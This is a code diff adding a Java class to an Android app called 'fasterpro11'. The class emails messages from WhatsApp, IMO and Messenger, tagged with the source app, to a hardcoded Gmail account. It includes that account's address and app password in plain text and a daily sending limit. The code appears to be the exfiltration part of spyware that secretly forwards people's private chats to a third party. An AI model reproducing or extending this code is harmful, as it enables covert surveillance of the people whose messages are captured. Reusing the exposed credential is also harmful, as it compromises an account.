@@ -1,0 +1,67 @@
+package com.example.fasterpro11;
+
+import android.annotation.SuppressLint;
+import android.util.Log;
+import java.util.Properties;
+import javax.mail.*;
+import javax.mail.internet.*;
+
+public class JavaMailAPI_WhatsAppIMOMessengerSender {
+    private static final String TAG = "JavaMailAPI_WhatsAppIMOMessengerSender";
+
+    @SuppressLint("LongLogTag")
+    public static void sendEmail(String app, String message) {
+        // দৈনিক সীমা চেক করুন
+        if (!CountEmail.canSendEmail()) {
+            Log.d(TAG, "Email limit reached for today. No email sent.");
+            return; // ইমেল পাঠানো হবে না
+        }
+
+        final String username = "abontiangum99@gmail.com"; // আপনার Gmail ঠিকানা
+        final String password = "egqnjvccoqtgwaxo"; // আপনার Gmail পাসওয়ার্ড
+
+        Properties props = new Properties();
+        props.put("mail.smtp.auth", "true");
+        props.put("mail.smtp.starttls.enable", "true");
+        props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP সার্ভার
+        props.put("mail.smtp.port", "587"); // SMTP পোর্ট
+
+        Session session = null;
+        try {
+            session = Session.getInstance(props,
+                    new javax.mail.Authenticator() {
+                        protected PasswordAuthentication getPasswordAuthentication() {
+                            return new PasswordAuthentication(username, password);
+                        }
+                    });
+        } catch (Exception e) {
+            Log.e(TAG, "Error occurred while creating session: " + e.getMessage(), e); // সেশন তৈরি ত্রুটি
+            e.printStackTrace();
+            return; // সেশন তৈরি ব্যর্থ হলে প্রক্রিয়া থামান
+        }
+
+        try {
+            // মেইল মেসেজ তৈরি করা
+            Message mimeMessage = new MimeMessage(session);
+            mimeMessage.setFrom(new InternetAddress(username));
+            mimeMessage.setRecipients(Message.RecipientType.TO,
+                    InternetAddress.parse("abontiangum99@gmail.com")); // গন্তব্যের ইমেইল ঠিকানা
+            mimeMessage.setSubject("New Message from " + app);
+            mimeMessage.setText("Message received from " + app + ":\n\n" + message);
+
+            try {
+                // মেইল পাঠানো
+                Transport.send(mimeMessage);
+                CountEmail.incrementEmailCount(); // ইমেল সফলভাবে পাঠানোর পর কাউন্টার বাড়ান
+                Log.d(TAG, "JavaMailAPI_WhatsAppIMOMessengerSender Email sent successfully.");
+            } catch (MessagingException e) {
+                Log.e(TAG, "JavaMailAPI_WhatsAppIMOMessengerSender Failed to send email: " + e.getMessage(), e);
+                e.printStackTrace();
+            }
+
+        } catch (MessagingException e) {
+            Log.e(TAG, "Error occurred while creating or sending email message: " + e.getMessage(), e); // মেইল তৈরি বা পাঠানোর ত্রুটি
+            e.printStackTrace();
+        }
+    }
+}
